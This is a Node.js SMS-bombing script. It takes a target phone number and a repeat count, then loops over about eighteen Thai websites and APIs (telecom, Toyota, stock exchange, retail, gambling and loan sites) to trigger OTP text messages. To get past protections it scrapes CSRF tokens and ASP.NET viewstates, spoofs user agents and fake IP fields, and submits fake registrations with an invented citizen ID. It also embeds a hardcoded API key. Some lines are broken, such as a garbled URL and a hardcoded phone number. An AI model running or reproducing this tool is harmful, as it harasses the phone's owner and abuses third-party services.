const axios = require("axios")
const formUrlEncoded = x =>
Object.keys(x).reduce((p, c) => p + `&${c}=${encodeURIComponent(x[c])}`, '')

var phone = process.argv[2];
var count = process.argv[3];

for (var i = 0; i < count; i++) {
	shopat24_spam(phone)
	Mcard_spam(phone)
	setmember_spam(phone)
	ais_spam(phone)
	ufa_spam(phone)
	baccarat_spam(phone)
	pizza_spam(phone)
	icc_spam(phone)
	cp_spam(phone)
	toyota_spam(phone)
	huaydee(phone)
	scg(phone)
	qbabet(phone)
	QQmoney_spam(phone)
	Mooncash_spam(phone)
	Needmoney_spam(phone)
	bet4u_spam(phone)
	cckspam(phone)
}

//==============================================================================
async function ais_spam(phone){
	try{
		var token = await axios.get('https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?httpGenerate=generated')
		var send = await axios({
			method: 'post',
			url: 'https://srfng.ais.co.th/api/v2/login/sendOneTimePW',
			data: {
				'msisdn': phone,
				'serviceId':'AISPlay',
				'accountType':'all',
				'otpChannel':'sms'
			},
			headers: {
				'Authorization': 'Bearer ' + token.data.match(/<!--<input type="hidden" id='token' value="[^}]*">-->\n/g)[0].replace(/\s+/g, '').replace(/'/g, '"').replace('">-->', '').replace('<!--<inputtype="hidden"id="token"value="',''),
				'Cookie': token.headers['set-cookie'],
				'X-Requested-With':' XMLHttpRequest',
			}
		})
		console.log("AIS : SUCCESS")
	}catch(e){
		console.log("AIS : ERROR")
	}
}

async function cckspam(phone){
    try{
        var send = await axios({
            method:"POST",
            url:"https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
            data:{username: phone,
                  password:"1111a1111A",
                  name: randomstr(32),
                  provinceCode:"74",
                  districtCode:"970",
                  subdistrictCode:"8654",
                  zipcode:"94140",
                  siebelCustomerTypeId:"710",
                  locale:"th_TH",
             headers: {
                 'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-N960N Build/LMY49I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Safari/537.36gpminiapp',
                 }
             }
		})
		console.log("HEE : SUCCESS")
	}catch(e){
		console.log("HEET : ERROR")
	}
}

async function setmember_spam(phone){
	try{
		var register = await axios({
			method:"POST",
			url:"https://api.set.or.th/api/member/registration",
			data:{
				itizenId: "4751762444328",
				country: "th",
				email: "sogood@meowmeow.com",
				firstName: "แมว",
				gender: "M",
				lastName: "รักน่าที่สุด",
				mobile: phone,
				passport: "",
				password: "BossNz#9999",
				subscriptionFlag: true,
				termFlag: true,
			}
		})
		var sendsms = await axios({
			method:"POST",
			url:"httpลs://api.set.or.th/api/otp/request",
			data:{
				channel: "MOBILE",
				refID: register.data.userRef,
				type: "REGISTRATION"
			}
		})
		console.log("SET : SUCCESS")
	}catch(e){
		console.log("SET : ERROR")
	}
}
async function Mcard_spam(phone){
	try{
		var get_csrf = await axios.get('https://www.mcardmall.com/th/home')
		var get_token = await axios({
			method:"GET",
			url:"https://www.mcardmall.com/th/apply/check",
			headers:{
				cookie:get_csrf.headers['set-cookie'][0]+";"+get_csrf.headers['set-cookie'][1]+";"
			}
		})
		await axios({
			method:"POST",
			url:"https://www.mcardmall.com/th/apply/check",
			data:formUrlEncoded({
				'_token': get_token.data.split('<input type="hidden" name="_token" value="').pop().split('">')[0],
				'mode': 'check',
				'identity': 3874953321682,
				'contact': phone,
				'P0': 'on',
				'P1': 'on',
				'P2': 'on',
			}),
			headers:{
				cookie:get_csrf.headers['set-cookie'][0]+";"+get_csrf.headers['set-cookie'][1]+";"
			}
		})
		console.log("MCARD : SUCCESS")
	}catch(e){
		console.log("MCARD : ERROR")
	}
}
async function QQmoney_spam(phone){
	try{
		var send = await axios({
			method:"POST",
			url:"https://www.qqmoney.ltd/jackey/sms/login",
			data:{
				"appId": "5fc9ff297eb51f1196350635",
				"companyId": "5fc9ff12197278da22aff029",
				"mobile": phone
			}
		})
		console.log("QQMONEY : SUCCESS")
	}catch(e){
		console.log("QQMONEY : ERROR")
	}
}
async function Mooncash_spam(phone){
	try{
		var send = await axios.get('http://m.thaiuang.com/uc/authcode/sms/get/reg/'+phone)
		console.log("MOONCASH : SUCCESS")
	}catch(e){
		console.log("MOONCASH : ERROR")
	}
}
async function Needmoney_spam(phone){
	try{
		var result = await axios({
			method:"POST",
			url:"https://api.needmone.com/api/register/app/sendSms",
			data:{
				"app_version": "1.0.0",
				"channel": "1",
				"phone": phone,
				"pkg_name": "com.kobi.bulaiente",
				"sign": randomstr(32),
				"timestamp": Math.floor(Date.now() / 1000),
				"type": "2",
				"version": "1.0.0"
			}
		})
		console.log("NEEDMONEY : SUCCESS")
	}catch(e){
		console.log("NEEDMONEY : ERROR")
	}
}
async function bet4u_spam(phone){
	try{
		var result = await axios({
			method:"POST",
			url:"https://baht4u.com/api/ext/send/sms?phone="+phone+"&triggerType=REGISTER_OR_LOGIN",
			headers:{
				'Content-Length': 0,
				'DEVICEID': randomstr(33),
				'Origin':'https://baht4u.com',
				'LANGUAGE': 'th',
				'VERSION': '1.0.4',
				'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-N960N Build/LMY49I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Safari/537.36gpminiapp',
				'Accept': 'application/json, text/plain, */*',
				'CHANNEL': 'a-minibaht4u',
				'DEVICETYPE': 'H5_Android',
				'Referer': 'https://baht4u.com/b4uh5/',
				'Accept-Encoding': 'gzip, deflate',
				'Accept-Language': 'th-TH,en-US;q=0.8',
				'Cookie': 'locale=th; deviceType=H5_Android; country=TH; currency=THB',
				'X-Requested-With': 'com.baht4u.gpapp',
				'Connection': 'keep-alive'
			}
		})
		console.log("BET4U : SUCCESS")
	}catch(e){
		console.log("BET4U : ERROR")
	}
}
async function shopat24_spam(phone){
	try{
		var getcsrf = await axios.get('https://www.shopat24.com/register/')
		var result = await axios({
			method:"POST",
			url:"https://www.shopat24.com/register/ajax/requestotp/",
			data: formUrlEncoded({
				'phoneNumber': phone
			}),
			headers:{
				'x-csrf-token':getcsrf.data.split('<meta name="_csrf" content="').pop().split('"')[0],
				'cookie':getcsrf.headers['set-cookie'][0]+getcsrf.headers['set-cookie'][1],
			}
		})
		console.log("SHOPAT24 : SUCCESS")
	}catch(e){
		console.log("SHOPAT24 : ERROR")
	}
}
async function pizza_spam(phone){
	try{
		var result = await axios({
			method:"POST",
			url:"https://api2.1112.com/api/v1/otp/create",
			data:{
				language: "th",
				phonenumber: "0954950599"
			}
		})
		console.log("PIZZA : SUCCESS")
	}catch(e){
		console.log("PIZZA : ERROR")
	}
}
async function ufa_spam(phone){
	try{
		var result = await axios.get('https://www.ufa442.com/register-otp')
		var token = result.data.split('_token: "').pop().split('"},')[0]
		var send = await axios({
			method:"POST",
			url:"https://www.ufa442.com/create/account/request-otp",
			data:formUrlEncoded({
				'phone': phone,
				'in_time': Math.floor(Date.now() / 1000),
				'_token': token
			}),
			headers:{
				'cookie':result.headers['set-cookie'][0]+";"+result.headers['set-cookie'][1],
				'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62'
			}
		})
		console.log("UFA442 : SUCCESS")
	}catch(e){
		console.log("UFA442 : ERROR")
	}
}
async function baccarat_spam(phone){
	try{
		var result = await axios({
			method:"POST",
			url:"https://api.baccaratth.com/api/v1/sendotp",
			data:formUrlEncoded({
				phone_number: phone
			})
		})
		console.log("BACCARAT : SUCCESS")
	}catch(e){
		console.log("BACCARAT : ERROR")
	}
}
async function icc_spam(phone){
	try{
		var result = await axios({
			method:"POST",
			url:"https://us-central1-otp-service-icc.cloudfunctions.net/getotp",
			data:{
				mobile_phone: phone,
				type: "HISHER"
			}
		})
		console.log("ICC : SUCCESS")
	}catch(e){
		console.log("ICC : ERROR")
	}
}
async function cp_spam(phone){
	try{
		var result = await axios({
			method:"POST",
			url:"https://cpfmapi.addressasia.com/wp-json/cpfm/v2/customer/get_otp",
			data:{
				phone: phone
			}
		})
		console.log("CP : SUCCESS")
	}catch(e){
		console.log("CP : ERROR")
	}
}
async function toyota_spam(phone){
	try{
		var result = await axios({
			method:"GET",
			url:"https://www.toyotaprivilege.com/Register.aspx",
		})
		var VIEWSTATE = result.data.split('<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="').pop().split('" />')[0]
		var VIEWSTATEGENERATOR = result.data.split('<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="').pop().split('" />')[0]
		var EVENTVALIDATION = result.data.split('<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="').pop().split('" />')[0]
		var send = await axios({
			method:"POST",
			url:"https://www.toyotaprivilege.com/Register.aspx",
			data:formUrlEncoded({
				'__LASTFOCUS': '',
				'__EVENTTARGET': 'btnOTP',
				'__EVENTARGUMENT': '' ,
				'__VIEWSTATE': VIEWSTATE,
				'__VIEWSTATEGENERATOR': VIEWSTATEGENERATOR,
				'__EVENTVALIDATION': EVENTVALIDATION,
				'txtFName': '',
				'txtLName': '',
				'rdoSex': 'rdoMen',
				'txtBirthdayDate': '',
				'txtPhoneNumber': phone,
				'txtEmail': '',
				'txtLicense1': '',
				'txtLicense2': '', 
				'txtOTP': '',
				'txtVIN': '',
				'hdf_otp_repeat': 0,
				'hdf_ReadTermAndPrivacy': '',
				'hdfShowPopupCookies': 0,
			})
		})
		console.log("TOYATA : SUCCESS")
	}catch(e){
		console.log("TOYATA : ERROR")
	}
}
async function huaydee(phone){
	try{
		var result = await axios({
			method:"POST",
			url:"https://referral.huaydee.com/v1/sendotp",
			data:{
				'phone': '+66'+phone.substring(1, 10)
			},
			headers: { 
				'x-api-key': '0tWnR4S38L6MD3aysXVjF83M0qaIwfdm1AeiiNDn',
				'Content-Type': 'application/x-www-form-urlencoded',
				'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62'
			}
		})
		console.log("HUAYDEE : SUCCESS")
	}catch(e){
		console.log("HUAYDEE : ERROR")
	}
}
async function scg(phone){
	try{
		var result = await axios({
			method: 'post',
			url: 'https://api.scg-id.com/api/otp/send_otp',
			headers: { 
				'Content-Type': 'application/json'
			},
			data : {
				"phone_no": phone
			}
		})
		console.log("SCG : SUCCESS")
	}catch(e){
		console.log("SCG : ERROR")
	}
}
async function qbabet(phone){
	try{
		var result = await axios({
			method: 'post',
			url: 'https://qbabet.com/member/action.php?get_otp',
			headers: { 
				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			},
			data : formUrlEncoded({
				'phone': phone,
				'ip': `${randomnumber(3)}.${randomnumber(3)}.${randomnumber(3)}.${randomnumber(3)}`
			})
		})
		console.log("QBABET : SUCCESS")
	}catch(e){
		console.log("QBABET : ERROR")
	}
}
//============================================

function randomnumber(length) {
	var result           = '';
	var characters       = '123456789';
	var charactersLength = characters.length;
	for ( var i = 0; i < length; i++ ) {
		result += characters.charAt(Math.floor(Math.random() * 
			charactersLength));
	}
	return result;
}

function randomstr(length) {
	var result           = '';
	var characters       = 'abcdefghijklmnopqrstuvwxyz0123456789';
	var charactersLength = characters.length;
	for ( var i = 0; i < length; i++ ) {
		result += characters.charAt(Math.floor(Math.random() * 
			charactersLength));
	}
	return result;
}
